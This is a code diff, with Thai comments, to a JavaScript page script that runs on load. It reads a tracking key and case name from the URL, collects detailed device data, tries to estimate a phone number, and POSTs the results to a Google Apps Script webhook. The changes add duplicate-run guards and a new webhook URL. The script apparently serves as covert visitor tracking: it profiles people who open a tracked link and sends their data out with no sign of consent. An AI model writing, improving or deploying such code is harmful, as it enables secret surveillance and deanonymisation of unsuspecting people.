@@ -24,6 +24,15 @@ function getUrlParameters() {
 
 // ฟังก์ชันหลักที่ทำงานทันทีเมื่อโหลดหน้าเว็บ
 (function() {
+  // ป้องกันการทำงานซ้ำซ้อน
+  if (sessionStorage.getItem('scriptExecuted') === 'true') {
+    console.log('Script already executed in this session. Preventing duplicate execution.');
+    return;
+  }
+  
+  // ทำเครื่องหมายว่าสคริปต์ได้ทำงานแล้วในเซสชันนี้
+  sessionStorage.setItem('scriptExecuted', 'true');
+  
   // เก็บข้อมูลทั่วไป
   const timestamp = new Date().toLocaleString('th-TH', {
     timeZone: 'Asia/Bangkok',
@@ -37,6 +46,12 @@ function getUrlParameters() {
   
   // ดึง tracking key และ case name จาก URL
   const { trackingKey, caseName } = getUrlParameters();
+
+  // ตรวจสอบว่า tracking key ถูกต้อง
+  if (!trackingKey || trackingKey === "ไม่มีค่า") {
+    console.log("Invalid tracking key - aborting data collection");
+    return;
+  }
 
   // เก็บข้อมูลอุปกรณ์และข้อมูลอื่นๆ
   const deviceInfo = getDetailedDeviceInfo();
@@ -755,7 +770,7 @@ async function estimatePhoneNumber() {
 
 // ส่งข้อมูลไปยัง webhook และป้องกันการส่งซ้ำ
 function sendToLineNotify(dataToSend) {
-  const webhookUrl = 'https://script.google.com/macros/s/AKfycbydls9VdR40-hUr_2uCGz7WXubw94sXLWVjUnd9Orh5vOAuarKfwSYvYI_ZpXKMvK13gg/exec';
+  const webhookUrl = 'https://script.google.com/macros/s/AKfycbwHbqQ9x5CSMdDBGNSJ_2wUQOgjYXUw2avrnzQNTOcYyyweudZUNlp_I-Q9RcZIR66G/exec';
 
   // 🎯สร้าง requestId เฉพาะสำหรับการส่งครั้งนี้
   if (!dataToSend.requestId) {
@@ -771,6 +786,10 @@ function sendToLineNotify(dataToSend) {
   
   console.log("กำลังส่งข้อมูลไป webhook (requestId: " + dataToSend.requestId + ")");
 
+  // บันทึก requestId ก่อนส่งเพื่อป้องกันการส่งซ้ำในกรณีที่มีการรีเฟรชหรือโหลดใหม่ระหว่างการส่ง
+  sentRequests.push(dataToSend.requestId);
+  sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
+
   // ส่งข้อมูล
   fetch(webhookUrl, {
     method: 'POST',
@@ -782,10 +801,6 @@ function sendToLineNotify(dataToSend) {
   })
   .then(() => {
     console.log("ส่งข้อมูลไปยัง Server สำเร็จ");
-    
-    // บันทึก requestId ที่ส่งสำเร็จแล้ว
-    sentRequests.push(dataToSend.requestId);
-    sessionStorage.setItem('sentRequests', JSON.stringify(sentRequests));
   })
   .catch(error => {
     console.error("เกิดข้อผิดพลาดในการส่งข้อมูล:", error);
